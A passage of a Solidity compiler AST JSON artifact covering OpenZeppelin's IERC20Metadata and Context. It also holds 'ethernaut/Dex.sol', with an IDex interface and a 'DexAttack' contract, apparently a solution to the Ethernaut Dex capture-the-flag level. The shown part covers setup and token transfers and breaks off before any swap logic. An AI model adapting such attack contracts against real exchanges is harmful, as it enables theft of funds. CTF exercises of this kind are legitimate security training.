										"referencedDeclaration": 664,
										"src": "305:6:2"
									},
									"id": 670,
									"nodeType": "InheritanceSpecifier",
									"src": "305:6:2"
								}
							],
							"canonicalName": "IERC20Metadata",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 668,
								"nodeType": "StructuredDocumentation",
								"src": "160:116:2",
								"text": " @dev Interface for the optional metadata functions from the ERC20 standard.\n _Available since v4.1._"
							},
							"fullyImplemented": false,
							"id": 689,
							"linearizedBaseContracts": [
								689,
								664
							],
							"name": "IERC20Metadata",
							"nameLocation": "287:14:2",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"documentation": {
										"id": 671,
										"nodeType": "StructuredDocumentation",
										"src": "318:54:2",
										"text": " @dev Returns the name of the token."
									},
									"functionSelector": "06fdde03",
									"id": 676,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nameLocation": "386:4:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 672,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "390:2:2"
									},
									"returnParameters": {
										"id": 675,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 674,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 676,
												"src": "416:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 673,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "416:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "415:15:2"
									},
									"scope": 689,
									"src": "377:54:2",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 677,
										"nodeType": "StructuredDocumentation",
										"src": "437:56:2",
										"text": " @dev Returns the symbol of the token."
									},
									"functionSelector": "95d89b41",
									"id": 682,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nameLocation": "507:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 678,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "513:2:2"
									},
									"returnParameters": {
										"id": 681,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 680,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 682,
												"src": "539:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 679,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "539:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "538:15:2"
									},
									"scope": 689,
									"src": "498:56:2",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 683,
										"nodeType": "StructuredDocumentation",
										"src": "560:65:2",
										"text": " @dev Returns the decimals places of the token."
									},
									"functionSelector": "313ce567",
									"id": 688,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nameLocation": "639:8:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 684,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "647:2:2"
									},
									"returnParameters": {
										"id": 687,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 686,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 688,
												"src": "673:5:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 685,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "673:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "672:7:2"
									},
									"scope": 689,
									"src": "630:50:2",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 690,
							"src": "277:405:2",
							"usedErrors": []
						}
					],
					"src": "110:573:2"
				},
				"id": 2
			},
			"@openzeppelin/contracts/utils/Context.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/utils/Context.sol",
					"exportedSymbols": {
						"Context": [
							711
						]
					},
					"id": 712,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 691,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "86:23:3"
						},
						{
							"abstract": true,
							"baseContracts": [],
							"canonicalName": "Context",
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": {
								"id": 692,
								"nodeType": "StructuredDocumentation",
								"src": "111:496:3",
								"text": " @dev Provides information about the current execution context, including the\n sender of the transaction and its data. While these are generally available\n via msg.sender and msg.data, they should not be accessed in such a direct\n manner, since when dealing with meta-transactions the account sending and\n paying for execution may not be the actual sender (as far as an application\n is concerned).\n This contract is only required for intermediate, library-like contracts."
							},
							"fullyImplemented": true,
							"id": 711,
							"linearizedBaseContracts": [
								711
							],
							"name": "Context",
							"nameLocation": "626:7:3",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 700,
										"nodeType": "Block",
										"src": "702:34:3",
										"statements": [
											{
												"expression": {
													"expression": {
														"id": 697,
														"name": "msg",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967281,
														"src": "719:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_magic_message",
															"typeString": "msg"
														}
													},
													"id": 698,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberLocation": "723:6:3",
													"memberName": "sender",
													"nodeType": "MemberAccess",
													"src": "719:10:3",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 696,
												"id": 699,
												"nodeType": "Return",
												"src": "712:17:3"
											}
										]
									},
									"id": 701,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_msgSender",
									"nameLocation": "649:10:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 693,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "659:2:3"
									},
									"returnParameters": {
										"id": 696,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 695,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 701,
												"src": "693:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 694,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "693:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "692:9:3"
									},
									"scope": 711,
									"src": "640:96:3",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 709,
										"nodeType": "Block",
										"src": "809:32:3",
										"statements": [
											{
												"expression": {
													"expression": {
														"id": 706,
														"name": "msg",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967281,
														"src": "826:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_magic_message",
															"typeString": "msg"
														}
													},
													"id": 707,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberLocation": "830:4:3",
													"memberName": "data",
													"nodeType": "MemberAccess",
													"src": "826:8:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_calldata_ptr",
														"typeString": "bytes calldata"
													}
												},
												"functionReturnParameters": 705,
												"id": 708,
												"nodeType": "Return",
												"src": "819:15:3"
											}
										]
									},
									"id": 710,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_msgData",
									"nameLocation": "751:8:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 702,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "759:2:3"
									},
									"returnParameters": {
										"id": 705,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 704,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 710,
												"src": "793:14:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 703,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "793:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "792:16:3"
									},
									"scope": 711,
									"src": "742:99:3",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "internal"
								}
							],
							"scope": 712,
							"src": "608:235:3",
							"usedErrors": []
						}
					],
					"src": "86:758:3"
				},
				"id": 3
			},
			"ethernaut/Dex.sol": {
				"ast": {
					"absolutePath": "ethernaut/Dex.sol",
					"exportedSymbols": {
						"Context": [
							711
						],
						"DexAttack": [
							1114
						],
						"ERC20": [
							586
						],
						"IDex": [
							725
						],
						"IERC20": [
							664
						],
						"IERC20Metadata": [
							689
						]
					},
					"id": 1115,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 713,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:4"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/ERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/ERC20.sol",
							"id": 714,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1115,
							"sourceUnit": 587,
							"src": "56:55:4",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"id": 715,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1115,
							"sourceUnit": 665,
							"src": "112:56:4",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IDex",
							"contractDependencies": [],
							"contractKind": "interface",
							"fullyImplemented": false,
							"id": 725,
							"linearizedBaseContracts": [
								725
							],
							"name": "IDex",
							"nameLocation": "180:4:4",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"functionSelector": "df791e50",
									"id": 724,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nameLocation": "198:4:4",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 722,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 717,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "211:4:4",
												"nodeType": "VariableDeclaration",
												"scope": 724,
												"src": "203:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 716,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "203:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 719,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "225:2:4",
												"nodeType": "VariableDeclaration",
												"scope": 724,
												"src": "217:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 718,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "217:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 721,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "234:6:4",
												"nodeType": "VariableDeclaration",
												"scope": 724,
												"src": "229:11:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 720,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "229:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "202:39:4"
									},
									"returnParameters": {
										"id": 723,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "250:0:4"
									},
									"scope": 725,
									"src": "189:62:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1115,
							"src": "170:83:4",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "DexAttack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 1114,
							"linearizedBaseContracts": [
								1114
							],
							"name": "DexAttack",
							"nameLocation": "263:9:4",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 727,
									"mutability": "mutable",
									"name": "token1",
									"nameLocation": "287:6:4",
									"nodeType": "VariableDeclaration",
									"scope": 1114,
									"src": "279:14:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 726,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "279:7:4",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 729,
									"mutability": "mutable",
									"name": "token2",
									"nameLocation": "307:6:4",
									"nodeType": "VariableDeclaration",
									"scope": 1114,
									"src": "299:14:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 728,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "299:7:4",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 731,
									"mutability": "mutable",
									"name": "token3",
									"nameLocation": "327:6:4",
									"nodeType": "VariableDeclaration",
									"scope": 1114,
									"src": "319:14:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 730,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "319:7:4",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 733,
									"mutability": "mutable",
									"name": "dex",
									"nameLocation": "347:3:4",
									"nodeType": "VariableDeclaration",
									"scope": 1114,
									"src": "339:11:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 732,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "339:7:4",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 754,
										"nodeType": "Block",
										"src": "421:79:4",
										"statements": [
											{
												"expression": {
													"id": 744,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 742,
														"name": "token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 727,
														"src": "431:6:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 743,
														"name": "_token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 735,
														"src": "440:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "431:16:4",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 745,
												"nodeType": "ExpressionStatement",
												"src": "431:16:4"
											},
											{
												"expression": {
													"id": 748,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 746,
														"name": "token2",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 729,
														"src": "457:6:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 747,
														"name": "_token2",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 737,
														"src": "466:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "457:16:4",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 749,
												"nodeType": "ExpressionStatement",
												"src": "457:16:4"
											},
											{
												"expression": {
													"id": 752,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 750,
														"name": "dex",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 733,
														"src": "483:3:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 751,
														"name": "_dex",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 739,
														"src": "489:4:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "483:10:4",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 753,
												"nodeType": "ExpressionStatement",
												"src": "483:10:4"
											}
										]
									},
									"id": 755,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 740,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 735,
												"mutability": "mutable",
												"name": "_token1",
												"nameLocation": "377:7:4",
												"nodeType": "VariableDeclaration",
												"scope": 755,
												"src": "369:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 734,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "369:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 737,
												"mutability": "mutable",
												"name": "_token2",
												"nameLocation": "394:7:4",
												"nodeType": "VariableDeclaration",
												"scope": 755,
												"src": "386:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 736,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "386:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 739,
												"mutability": "mutable",
												"name": "_dex",
												"nameLocation": "411:4:4",
												"nodeType": "VariableDeclaration",
												"scope": 755,
												"src": "403:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 738,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "403:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "368:48:4"
									},
									"returnParameters": {
										"id": 741,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "421:0:4"
									},
									"scope": 1114,
									"src": "357:143:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 764,
										"nodeType": "Block",
										"src": "548:33:4",
										"statements": [
											{
												"expression": {
													"id": 762,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 760,
														"name": "token3",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 731,
														"src": "558:6:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 761,
														"name": "_token3",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 757,
														"src": "567:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "558:16:4",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 763,
												"nodeType": "ExpressionStatement",
												"src": "558:16:4"
											}
										]
									},
									"functionSelector": "2216e590",
									"id": 765,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "setToken3",
									"nameLocation": "515:9:4",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 758,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 757,
												"mutability": "mutable",
												"name": "_token3",
												"nameLocation": "533:7:4",
												"nodeType": "VariableDeclaration",
												"scope": 765,
												"src": "525:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 756,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "525:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "524:17:4"
									},
									"returnParameters": {
										"id": 759,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "548:0:4"
									},
									"scope": 1114,
									"src": "506:75:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 912,
										"nodeType": "Block",
										"src": "617:702:4",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 772,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "655:3:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 773,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "659:6:4",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "655:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 776,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "675:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																],
																"id": 775,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "667:7:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 774,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "667:7:4",
																	"typeDescriptions": {}
																}
															},
															"id": 777,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "667:13:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3130",
															"id": 778,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "682:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															},
															"value": "10"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 769,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 727,
																	"src": "634:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 768,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "627:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 770,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "627:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 771,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "642:12:4",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 663,
														"src": "627:27:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 779,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "627:58:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 780,
												"nodeType": "ExpressionStatement",
												"src": "627:58:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 785,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "723:3:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 786,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "727:6:4",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "723:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 789,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "743:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																],
																"id": 788,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "735:7:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 787,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "735:7:4",
																	"typeDescriptions": {}
																}
															},
															"id": 790,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "735:13:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3130",
															"id": 791,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "750:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															},
															"value": "10"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_10_by_1",
																"typeString": "int_const 10"
															}
														],
														"expression": {
															"arguments": [
																{
